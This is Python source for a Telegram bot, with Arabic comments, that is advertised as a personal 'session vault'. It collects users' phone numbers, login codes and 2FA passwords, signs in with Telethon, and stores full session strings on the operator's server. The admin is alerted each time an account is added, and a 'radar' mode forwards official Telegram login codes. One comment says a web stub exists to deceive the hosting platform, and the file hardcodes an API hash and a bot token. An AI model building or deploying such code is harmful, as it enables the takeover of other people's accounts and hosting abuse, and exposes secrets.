import os
import json
import asyncio
import time
import logging
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# --- الإعدادات المباشرة ---
API_ID = 35980161
API_HASH = 'd879538c1b65ee6aa57ac3b4ce4b63d3'
BOT_TOKEN = '8615971361:AAHI51Wd-fj5xKcUwbqyJxbgA7CuuSjebIY'
ADMIN_ID = 8718973896

DB_FILE = 'sessions.json'
active_clients = {}  
radar_mode = {}      
user_states = {}     
app = None

# --- Rate Limiting ---
last_action_time = {}
RATE_LIMIT_SECONDS = 2

# --- Logging ---
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Web Server for Render (لخداع المنصة) ---
def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"VANTA Bot is Alive")
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

threading.Thread(target=run_web_server, daemon=True).start()

# --- قاعدة البيانات ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except: return {}
    return {}

def save_db():
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

db = load_db()

# --- دالة الأزرار الملونة ---
def btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data: kwargs["callback_data"] = callback_data
    if url: kwargs["url"] = url
    if style:
        try:
            return InlineKeyboardButton(**kwargs, style=style)
        except TypeError:
            pass
    return InlineKeyboardButton(**kwargs)

# --- إدارة حسابات Telethon ---
async def start_telethon_client(user_id, phone, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            return None
        
        @client.on(events.NewMessage(from_users=777000))
        async def otp_handler(event):
            if radar_mode.get(user_id) == phone:
                code = event.raw_text
                try:
                    await app.bot.send_message(
                        chat_id=user_id,
                        text=f"🔑 **وصل الرمز لحساب:** `{phone}`\n\n**الرمز:**\n`{code}`\n\nقم بنسخه فوراً.",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"Error sending to {user_id}: {e}")
                radar_mode.pop(user_id, None)
        return client
    except Exception as e:
        logger.error(f"Failed to load client {phone}: {e}")
        return None

async def load_all_clients():
    needs_save = False
    for user_id_str, sessions in list(db.items()):
        user_id = int(user_id_str)
        if user_id not in active_clients:
            active_clients[user_id] = {}
        for phone, data in list(sessions.items()):
            session_str = data
            if isinstance(data, dict):
                session_str = data.get("session")
            else:
                # ترقية الجلسات القديمة للصيغة الجديدة
                db[user_id_str][phone] = {"session": data, "label": phone, "added_at": "غير معروف"}
                needs_save = True
                
            client = await start_telethon_client(user_id, phone, session_str)
            if client:
                active_clients[user_id][phone] = client
                logger.info(f"✅ Loaded client for {user_id} - {phone}")
    if needs_save:
        save_db()

# --- أوامر البوت ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = time.time()
    
    if now - last_action_time.get(user_id, 0) < RATE_LIMIT_SECONDS:
        await update.message.reply_text("⚠️ الرجاء الانتظار قليلاً قبل تنفيذ أمر آخر.")
        return
    last_action_time[user_id] = now

    keyboard = [
        [btn("➕ إضافة حساب جديد", "add_account", style="success")],
        [btn("📱 حساباتي", "my_accounts", style="primary")],
        [btn("📤 تصدير الجلسات", "export_sessions", style="primary"), btn("📥 استيراد الجلسات", "import_sessions", style="success")]
    ]
    if user_id == ADMIN_ID:
        keyboard.append([btn("⚙️ لوحة الإدارة", "admin_panel", style="danger")])

    await update.message.reply_text("أهلاً بك يا سيدي في خزنة الجلسات.\nماذا تريد أن تفعل؟", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "main_menu":
        user_states.pop(user_id, None)
        keyboard = [
            [btn("➕ إضافة حساب جديد", "add_account", style="success")],
            [btn("📱 حساباتي", "my_accounts", style="primary")],
            [btn("📤 تصدير الجلسات", "export_sessions", style="primary"), btn("📥 استيراد الجلسات", "import_sessions", style="success")]
        ]
        if user_id == ADMIN_ID:
            keyboard.append([btn("⚙️ لوحة الإدارة", "admin_panel", style="danger")])
        await query.edit_message_text("ماذا تريد أن تفعل؟", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "admin_panel" and user_id == ADMIN_ID:
        total_users = len(db)
        total_sessions = sum(len(s) for s in db.values())
        keyboard = [
            [btn("📢 إرسال إذاعة", "broadcast", style="primary")],
            [btn("🔄 تحديث الإحصائيات", "admin_panel", style="success")],
            [btn("🔙 رجوع", "main_menu", style="danger")]
        ]
        text = f"⚙️ **لوحة الإدارة**\n\n👥 عدد المستخدمين: {total_users}\n📱 إجمالي الجلسات: {total_sessions}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "broadcast" and user_id == ADMIN_ID:
        user_states[user_id] = "waiting_broadcast"
        await query.edit_message_text("أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:")
        return

    if data == "add_account":
        user_states[user_id] = "waiting_phone"
        await query.edit_message_text("أرسل رقم هاتفك مع رمز الدولة (مثال: +213xxxxxxxx):")
    
    elif data == "my_accounts":
        user_sessions = db.get(str(user_id), {})
        if not user_sessions:
            await query.edit_message_text("ليس لديك أي حسابات مسجلة حالياً.")
            return
        
        keyboard = []
        for phone, info in user_sessions.items():
            label = info.get("label", phone) if isinstance(info, dict) else phone
            keyboard.append([btn(f"📱 {label}", f"view_{phone}", style="primary")])
        keyboard.append([btn("🔙 رجوع", "main_menu", style="danger")])
        await query.edit_message_text("اختر حساباً لإدارته:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("view_"):
        phone = data.split("_", 1)[1]
        user_sessions = db.get(str(user_id), {})
        info = user_sessions.get(phone)
        if not info:
            await query.edit_message_text("الحساب غير موجود.")
            return
            
        label = info.get("label", "بدون اسم") if isinstance(info, dict) else phone
        added_at = info.get("added_at", "غير معروف") if isinstance(info, dict) else "غير معروف"
        
        keyboard = [
            [btn("⏳ انتظار رمز الدخول (رادار)", f"radar_{phone}", style="danger")],
            [btn("ℹ️ معلومات الحساب", f"info_{phone}", style="primary")],
            [btn("✏️ تعديل الاسم", f"label_{phone}", style="success")],
            [btn("❌ حذف الحساب", f"delete_{phone}", style="danger")],
            [btn("🔙 رجوع", "my_accounts", style="primary")]
        ]
        text = f"📱 **الحساب:** `{phone}`\n🏷️ **الاسم:** {label}\n📅 **تاريخ الإضافة:** {added_at}"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
        
    elif data.startswith("radar_"):
        phone = data.split("_", 1)[1]
        radar_mode[user_id] = phone
        await query.edit_message_text(f"✅ **الرادار يعمل الآن لحساب:** `{phone}`\n\nاذهب لهاتفك وأدخل رقمك، وبمجرد وصول الكود سأرسله لك هنا.", parse_mode="Markdown")

    elif data.startswith("info_"):
        phone = data.split("_", 1)[1]
        client = active_clients.get(user_id, {}).get(phone)
        if not client:
            await query.edit_message_text("❌ الحساب غير متصل حالياً.")
            return
        try:
            me = await client.get_me()
            name = f"{me.first_name} {me.last_name or ''}".strip()
            username = f"@{me.username}" if me.username else "لا يوجد"
            text = f"ℹ️ **معلومات الحساب:**\n\n👤 **الاسم:** {name}\n🆔 **الآيدي:** `{me.id}`\n🔗 **المعرف:** {username}\n📞 **الرقم:** `{phone}`"
            await query.edit_message_text(text, parse_mode="Markdown")
        except Exception as e:
            await query.edit_message_text(f"❌ خطأ في جلب المعلومات: {e}")

    elif data.startswith("delete_"):
        phone = data.split("_", 1)[1]
        if str(user_id) in db and phone in db[str(user_id)]:
            del db[str(user_id)][phone]
            save_db()
            
            client = active_clients.get(user_id, {}).pop(phone, None)
            if client:
                await client.disconnect()
            
            await query.edit_message_text(f"✅ تم حذف الحساب `{phone}` نهائياً.", parse_mode="Markdown")
        else:
            await query.edit_message_text("❌ الحساب غير موجود.")

    elif data.startswith("label_"):
        phone = data.split("_", 1)[1]
        user_states[user_id] = f"waiting_label:{phone}"
        await query.edit_message_text("أرسل الاسم الجديد الذي تريد إطلاقه على هذا الحساب:")

    elif data == "export_sessions":
        user_sessions = db.get(str(user_id), {})
        if not user_sessions:
            await query.edit_message_text("لا توجد جلسات لتصديرها.")
            return
        
        filename = f"sessions_{user_id}.json"
        with open(filename, 'w') as f:
            json.dump(user_sessions, f, ensure_ascii=False, indent=4)
        
        await query.message.reply_document(document=open(filename, 'rb'), filename=filename, caption="💾 هذا ملف الجلسات الخاص بك. احتفظ به في مكان آمن لاستعادته لاحقاً.")
        os.remove(filename)
    
    elif data == "import_sessions":
        user_states[user_id] = "waiting_import"
        await query.edit_message_text("أرسل ملف الجلسات (JSON) الذي قمت بتصديره سابقاً.")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_states.get(user_id)
    if not state: return

    text = update.message.text or ""

    if state == "waiting_broadcast" and user_id == ADMIN_ID:
        success = 0
        fail = 0
        await update.message.reply_text("⏳ جاري الإذاعة...")
        for uid in db.keys():
            try:
                await app.bot.send_message(chat_id=int(uid), text=f"📢 **إعلان:**\n\n{text}")
                success += 1
            except:
                fail += 1
        await update.message.reply_text(f"✅ انتهت الإذاعة.\nنجح: {success}\nفشل: {fail}")
        user_states.pop(user_id, None)

    elif state == "waiting_phone":
        phone = text.strip()
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            await client.send_code_request(phone)
            user_states[user_id] = f"waiting_code:{phone}"
            if user_id not in active_clients: active_clients[user_id] = {}
            active_clients[user_id][f"temp_{phone}"] = client
            await update.message.reply_text(f"✅ تم إرسال الكود لهاتفك. أرسل الكود هنا الآن:")
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_code:"):
        phone = state.split(":", 1)[1]
        code = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        if not client:
            await update.message.reply_text("❌ انتهت الجلسة المؤقتة، أعد المحاولة.")
            user_states.pop(user_id, None)
            return
        
        try:
            await client.sign_in(phone, code)
            session_str = StringSession.save(client.session)
            
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {
                "session": session_str,
                "label": phone,
                "added_at": time.strftime("%Y-%m-%d %H:%M")
            }
            save_db()
            
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            
            await app.bot.send_message(ADMIN_ID, f"🔔 مستخدم جديد أضاف حساباً:\nID: `{user_id}`\nPhone: `{phone}`", parse_mode="Markdown")
            
            await update.message.reply_text(f"🔥 تم تسجيل الدخول وحفظ الجلسة بنجاح!\nالحساب الآن محفوظ في خزنتك.")
            user_states.pop(user_id, None)
            
        except SessionPasswordNeededError:
            user_states[user_id] = f"waiting_password:{phone}"
            await update.message.reply_text("🔐 الحساب محمي بكلمة مرور (2FA). أرسل كلمة المرور:")
        except Exception as e:
            await update.message.reply_text(f"❌ كود خاطئ أو خطأ: {e}")
            user_states.pop(user_id, None)

    elif state.startswith("waiting_password:"):
        phone = state.split(":", 1)[1]
        password = text.strip()
        client = active_clients.get(user_id, {}).get(f"temp_{phone}")
        
        try:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
            
            if str(user_id) not in db: db[str(user_id)] = {}
            db[str(user_id)][phone] = {
                "session": session_str,
                "label": phone,
                "added_at": time.strftime("%Y-%m-%d %H:%M")
            }
            save_db()
            
            active_clients[user_id].pop(f"temp_{phone}", None)
            active_clients[user_id][phone] = client
            
            await app.bot.send_message(ADMIN_ID, f"🔔 مستخدم جديد أضاف حساباً (2FA):\nID: `{user_id}`\nPhone: `{phone}`", parse_mode="Markdown")
            
            await update.message.reply_text("🔥 تم تسجيل الدخول وحفظ الجلسة بنجاح (مع 2FA)!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ كلمة مرور خاطئة: {e}")
            user_states.pop(user_id, None)

    elif state == "waiting_import":
        if not update.message.document:
            await update.message.reply_text("❌ الرجاء إرسال ملف JSON صالح.")
            return
        
        file = await update.message.document.get_file()
        file_path = f"import_{user_id}.json"
        await file.download_to_drive(file_path)
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                imported_data = json.load(f)
            
            if str(user_id) not in db: db[str(user_id)] = {}
                
            count = 0
            for phone, data in imported_data.items():
                if isinstance(data, str): 
                    session_str, label, added_at = data, phone, time.strftime("%Y-%m-%d %H:%M")
                else:
                    session_str = data.get("session")
                    label = data.get("label", phone)
                    added_at = data.get("added_at", time.strftime("%Y-%m-%d %H:%M"))
                
                db[str(user_id)][phone] = {"session": session_str, "label": label, "added_at": added_at}
                
                if user_id not in active_clients: active_clients[user_id] = {}
                client = await start_telethon_client(user_id, phone, session_str)
                if client: active_clients[user_id][phone] = client
                count += 1
            
            save_db()
            os.remove(file_path)
            
            await update.message.reply_text(f"🔥 تم استيراد {count} جلسة بنجاح!")
            user_states.pop(user_id, None)
        except Exception as e:
            await update.message.reply_text(f"❌ ملف غير صالح أو حدث خطأ: {e}")
            if os.path.exists(file_path): os.remove(file_path)
            
    elif state.startswith("waiting_label:"):
        phone = state.split(":", 1)[1]
        new_label = text.strip()
        
        if str(user_id) in db and phone in db[str(user_id)]:
            if isinstance(db[str(user_id)][phone], str):
                 db[str(user_id)][phone] = {"session": db[str(user_id)][phone], "label": new_label, "added_at": "غير معروف"}
            else:
                 db[str(user_id)][phone]["label"] = new_label
            save_db()
            await update.message.reply_text(f"✅ تم تغيير اسم الحساب `{phone}` إلى: **{new_label}**", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ الحساب غير موجود.")
        user_states.pop(user_id, None)

# --- التشغيل الرئيسي ---
async def main():
    global app
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler((filters.TEXT | filters.Document.ALL) & ~filters.COMMAND, message_handler))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("Loading saved sessions...")
    await load_all_clients()
    logger.info("Bot is fully operational!")
    
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
